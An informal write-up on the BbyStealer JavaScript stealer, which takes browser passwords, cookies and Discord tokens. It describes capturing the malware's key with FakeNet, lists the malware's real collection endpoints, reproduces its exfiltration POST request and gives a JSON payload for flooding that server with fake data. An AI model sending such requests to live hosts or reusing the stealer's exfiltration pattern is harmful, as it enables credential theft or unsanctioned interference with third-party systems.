
<!-- WARNING HTML -->

<table align="center">
  <tr>
    <th>Title</th>
  </tr>
  <tr>
    <td>BbyStealer</td>
  </tr>
</table>
<br></br>

<!-- WARNING HTML -->

Hello, did you heard about [BbyStealer](https://github.com/Green-Avocado/bbystealer-malware-analysis) ?
This is a shitty javascript malware to steal somes browsers passwords, cookies and target somes discord clients for your account token.
BbyStealer can download a malicious javascript code online to pick your discord creds with functions detouring.

## Start

**How many people thought of sending shit trought BbyStealer x)**

Let's see what we would need to do that:

- Get the BbyStealer key.
- Somes endpoints for sending the shitty data.
- Knowledge of scripting.

### How would I got the BbyStealer key ?

**Dynamic or static analysis ?**

The javascript malware is obfuscated, to be fast you can setup a vm and install [FakeNet](https://github.com/mandiant/flare-fakenet-ng), launch the malware and use FakeNet to get the request (The path is the key look like this key:jNQzkAMmc1Uy)


### Endpoints !

Right now we know somes existing endpoints with POST http method:

- [maliciousWebsite](https://superfuniestindianparty.rip)/jNQzkAMmc1Uy/tokens
- [maliciousWebsite](https://superfuniestindianparty.rip)/jNQzkAMmc1Uy

The request:

```

POST /jNQzkAMmc1Uy HTTP/1.1
Host: superfuniestindianparty.rip
Connection: keep-alive
Content-Length: 215
Access-Control-Allow-Origin: *
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: fr


**Our data in json format**

```

### How to send our fake data ?

To send our data, I made a simple payload look at this

```json
{"username":"discord.gg/miaou","id":"Ajoute-moi","avatar":null,"badges":1,"email":"freeearlyavie@gmail.com","token":".gg/overdrive","type":"login","password":"UNEARLY"}
```

Lets re-use our request we got and put the fake data in!

## Ending

Thanks for reading this <3
